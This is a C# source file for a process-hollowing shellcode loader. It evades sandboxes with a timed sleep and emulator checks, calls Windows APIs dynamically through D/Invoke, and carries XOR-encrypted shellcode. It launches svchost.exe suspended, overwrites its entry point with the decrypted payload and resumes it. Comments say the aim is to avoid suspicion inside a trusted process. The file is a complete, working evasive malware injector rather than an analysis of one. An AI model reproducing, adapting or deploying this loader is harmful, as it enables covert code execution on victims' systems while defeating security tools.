using System;
using System.Runtime.InteropServices;
using DInvoke.DynamicInvoke;

namespace Hollow
{
    class Program
    {
        static void Main()
        {
            //Sleep to avoid sandbox environments
            DateTime t1 = DateTime.Now;
            var sleepParameters = new object[]
            {
                (uint)5000
            };

            Generic.DynamicApiInvoke("kernel32.dll", "Sleep", typeof(Win32.Sleep), ref sleepParameters);

            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 4.69)
            {
                Console.WriteLine("Exiting as sleep wasn't met...");
                return;
            }

            var getCurrentProcParameters = new object[] { };
            var vaexParameters = new object[]
            {
                Generic.DynamicApiInvoke("kernel32.dll", "GetCurrentProcess", typeof(Win32.GetCurrentProcess), ref getCurrentProcParameters), IntPtr.Zero, (uint)0x1000, (uint)0x3000, (uint)0x40, (uint)0
            };

            IntPtr veax = (IntPtr)Generic.DynamicApiInvoke("kernel32.dll", "VirtualAllocExNuma", typeof(Win32.VirtualAllocExNuma), ref vaexParameters);

            if (veax == null)
            {
                return;
            }

            var flsParameters = new object[]
            {
                IntPtr.Zero
            };

            IntPtr fls = (IntPtr)Generic.DynamicApiInvoke("kernel32.dll", "FlsAlloc", typeof(Win32.FlsAlloc), ref flsParameters);

            if (fls == null)
            {
                return;
            }

            string k = "flareon";

            // Place encrypted shellcode here
            // Obtain by running encryption.py with the same key as above
            byte[] encBytes = new byte[] { 0x9a, 0x24, 0xe2, 0x96, 0x95, 0x87, 0xae, 0x66, 0x6c, 0x61, 0x33, 0x34, 0x2e, 0x3e, 0x34, 0x3d, 0x37, 0x3a, 0x54, 0xbd, 0x0b, 0x2e, 0xe7, 0x33, 0x12, 0x2d, 0xe4, 0x3c, 0x7e, 0x24, 0xea, 0x20, 0x45, 0x27, 0xe5, 0x14, 0x3c, 0x29, 0x7d, 0xd2, 0x25, 0x24, 0x2b, 0x5d, 0xa8, 0x3a, 0x54, 0xaf, 0xc2, 0x5a, 0x0d, 0x1d, 0x70, 0x49, 0x4f, 0x2f, 0xa7, 0xa5, 0x6c, 0x33, 0x64, 0xae, 0x8c, 0x8b, 0x3e, 0x20, 0x23, 0x2d, 0xe4, 0x3c, 0x46, 0xe7, 0x23, 0x4e, 0x2d, 0x6e, 0xbe, 0xed, 0xec, 0xe9, 0x72, 0x65, 0x6f, 0x26, 0xe3, 0xac, 0x15, 0x15, 0x2d, 0x6e, 0xbe, 0x36, 0xe7, 0x29, 0x6a, 0x21, 0xe4, 0x2e, 0x46, 0x25, 0x60, 0xa2, 0x86, 0x39, 0x26, 0x99, 0xa5, 0x20, 0xf9, 0x51, 0xe7, 0x26, 0x67, 0xba, 0x2c, 0x43, 0xac, 0x27, 0x5f, 0xa6, 0xc0, 0x20, 0xb3, 0xac, 0x62, 0x2f, 0x67, 0xad, 0x59, 0x92, 0x10, 0x9e, 0x22, 0x65, 0x20, 0x45, 0x7a, 0x20, 0x56, 0xbf, 0x13, 0xb4, 0x39, 0x36, 0xee, 0x2f, 0x4a, 0x2f, 0x6d, 0xb1, 0x14, 0x24, 0xe4, 0x62, 0x2e, 0x28, 0xea, 0x32, 0x79, 0x26, 0x6f, 0xb6, 0x2d, 0xea, 0x76, 0xed, 0x27, 0x6f, 0xb6, 0x2d, 0x39, 0x33, 0x3d, 0x31, 0x37, 0x3c, 0x2d, 0x39, 0x33, 0x3c, 0x2e, 0x34, 0x2e, 0xef, 0x8d, 0x52, 0x24, 0x3d, 0x91, 0x86, 0x34, 0x20, 0x2b, 0x3f, 0x27, 0xe5, 0x74, 0x85, 0x36, 0x8d, 0x9a, 0x90, 0x33, 0x2e, 0xd6, 0x60, 0x72, 0x65, 0x6f, 0x6e, 0x66, 0x6c, 0x61, 0x3a, 0xe8, 0xe2, 0x6f, 0x67, 0x6c, 0x61, 0x33, 0xdf, 0x5e, 0xe5, 0x09, 0xeb, 0x9e, 0xa7, 0xde, 0x9f, 0xdb, 0xc4, 0x3a, 0x20, 0xc8, 0xc3, 0xfa, 0xd3, 0xfb, 0x93, 0xb4, 0x3a, 0xe6, 0xab, 0x46, 0x5a, 0x6a, 0x1d, 0x78, 0xe5, 0x94, 0x8e, 0x13, 0x69, 0xda, 0x35, 0x76, 0x1d, 0x01, 0x0c, 0x6c, 0x38, 0x33, 0xec, 0xb5, 0x91, 0xb3, 0x0f, 0x00, 0x1e, 0x06, 0x41, 0x0b, 0x1e, 0x09, 0x61 };

            //Create objects of startup info and process info, as stated in the structures in the Win32.cs file
            Win32.STARTUPINFO si = new Win32.STARTUPINFO();
            Win32.PROCESS_INFORMATION pi = new Win32.PROCESS_INFORMATION();
            var pa = new Win32.SECURITY_ATTRIBUTES();
            var ta = new Win32.SECURITY_ATTRIBUTES();

            si.cb = Marshal.SizeOf(si);
            pa.nLength = Marshal.SizeOf(pa);
            ta.nLength = Marshal.SizeOf(ta);

            var createProcessParameters = new object[]
            {
                "C:\\Windows\\System32\\svchost.exe", null, pa, ta, false, (uint)0x00000004 , IntPtr.Zero, "C:\\Windows\\System32", si, pi
            };

            //Create a suspended process of svchost.exe
            bool cpCheck = (bool)Generic.DynamicApiInvoke("kernel32.dll", "CreateProcessW", typeof(Win32.CreateProcessW), ref createProcessParameters);

            if (cpCheck == true)
            {
                pi = (Win32.PROCESS_INFORMATION)createProcessParameters[9];
                Console.WriteLine("[*] Created svchost.exe process successfully! PID: {0}", pi.dwProcessId);
            }
            else
            {
                Console.WriteLine("[!] There was an error creating svchost.exe!");
            }


            Win32.PROCESS_BASIC_INFORMATION bi = new Win32.PROCESS_BASIC_INFORMATION();
            IntPtr hProcess = pi.hProcess;
            uint tmp = 0;
            var address = Generic.GetLibraryAddress("ntdll.dll", "ZwQueryInformationProcess");
            var zwQueryInformationProcess = (Win32.ZwQueryInformationProcess)Marshal.GetDelegateForFunctionPointer(address, typeof(Win32.ZwQueryInformationProcess));

            int res = zwQueryInformationProcess(
                hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp
                );

            if (res == 0)
            {
                Console.WriteLine("[*] Got process information using ZwQueryInformationProcess...");
            }
            else
            {
                Console.WriteLine("[!] Failed to get process information using ZwQueryInformationProcess :(");
                return;
            }

            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

            var rpmAddress = Generic.GetLibraryAddress("kernel32.dll", "ReadProcessMemory");
            var readProcessMemory = (Win32.ReadProcessMemory)Marshal.GetDelegateForFunctionPointer(rpmAddress, typeof(Win32.ReadProcessMemory));

            var r1 = readProcessMemory(
                    hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead
                );

            if (!r1)
            {
                Console.WriteLine("[!] Failed to ReadProcessMemory on the first try :(");
                return;
            }

            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
            Console.WriteLine($"[*] Obtained base of svchost.exe (0x{svchostBase.ToString("x")})");

            byte[] data = new byte[0x200];

            var r2 = readProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

            if (!r2)
            {
                Console.WriteLine("[!] Failed to ReadProcessMemory on the second try :(");
                return;
            }

            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);

            // Add the address of svchost base to the entry point calculated by adding the offset of the optional header to our base data address
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
            Console.WriteLine($"[*] Found address of Entry Point (0x{addressOfEntryPoint.ToString("x")})");

            // Decryption Routine
            for (int i = 0; i < encBytes.Length; i++) {

                encBytes[i] = (byte)(encBytes[i] ^ k[i % k.Length]);
            }
            
            //Write shellcode into the processes execution instructions
            var writeProcMemParameters = new object[]
            {
                hProcess, addressOfEntryPoint, encBytes, encBytes.Length, nRead
            };
            var writeCheck = (bool)Generic.DynamicApiInvoke("kernel32.dll", "WriteProcessMemory", typeof(Win32.WriteProcessMemory), ref writeProcMemParameters);

            if (!writeCheck)
            {
                Console.Write("[!] Failed to write to remote svchost process!");
                return;
            }
            else
            {
                Console.WriteLine("[*] Performed remote process write into svchost...");
            }

            //Since the thread is suspended, we resume rather than execute it
            //Hopefully avoids suspicion more than previous methods, as this is a trusted process that communicates over networks regularly
            var resThreadParameters = new object[]
            {
                pi.hThread
            };

            uint resumeCheck = (uint)Generic.DynamicApiInvoke("kernel32.dll", "ResumeThread", typeof(Win32.ResumeThread), ref resThreadParameters);
            if (resumeCheck > 1)
            {
                Console.WriteLine($"[!] Failed to resume the thread! It is still suspended! Returned value: {resumeCheck}!");
                return;
            }
            else if (resumeCheck == 0)
            {
                Console.WriteLine($"[!] No idea how we got here. Thread appears to have not been suspended in the first place! Returned value: {resumeCheck}");
            }
            else
            {
                Console.WriteLine($"[*] Resumed thread successfully! Returned value: {resumeCheck}!");
            }
        }
    }
}